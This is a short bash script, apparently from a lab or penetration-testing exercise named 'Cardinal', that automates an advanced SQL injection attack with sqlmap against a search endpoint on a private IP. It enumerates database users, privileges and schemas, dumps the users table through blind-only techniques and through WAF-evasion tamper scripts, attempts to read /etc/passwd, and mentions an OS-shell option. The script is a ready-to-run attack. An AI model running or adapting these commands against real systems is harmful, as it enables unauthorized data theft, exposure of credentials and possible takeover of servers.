#!/bin/bash
# Cardinal — ADVANCED automated SQLi with sqlmap.
# Goes past the basic run_sqli.sh: full enumeration, blind-only techniques,
# WAF-evasion tamper scripts, privilege/DBA checks, and a file-read attempt.
# Target is the directory-search endpoint through the proxy.
TARGET="http://172.30.0.10/search?q=test"
OUT=/tmp/sqlmap-advanced
COMMON="--batch --output-dir=$OUT -p q -u $TARGET"

echo "[*] Target: $TARGET"
echo "[*] Output: $OUT"

echo; echo "=== A. Full enumeration: banner, current user, DBA status, privileges ==="
sqlmap $COMMON --banner --current-user --current-db --is-dba --privileges

echo; echo "=== B. Enumerate all databases and the full schema ==="
sqlmap $COMMON --dbs --schema

echo; echo "=== C. Blind-ONLY extraction (force boolean+time; no UNION/error) ==="
# Proves data is recoverable even if UNION and error channels were closed.
sqlmap $COMMON --technique=BT --dump -T users

echo; echo "=== D. WAF/filter evasion via tamper scripts ==="
# space2comment: spaces -> /**/   ;  randomcase: UnIoN  ;  between: '>' -> NOT BETWEEN
sqlmap $COMMON --tamper=space2comment,randomcase,between --level=5 --risk=3 --dump -T users

echo; echo "=== E. Filesystem / OS reach (expected to FAIL: portal user lacks FILE priv) ==="
sqlmap $COMMON --file-read=/etc/passwd
# --os-shell / --sql-shell are available too, but need FILE/stacked support:
# sqlmap $COMMON --os-shell

echo; echo "[*] Advanced sqlmap run complete. Loot (if any) under $OUT/"
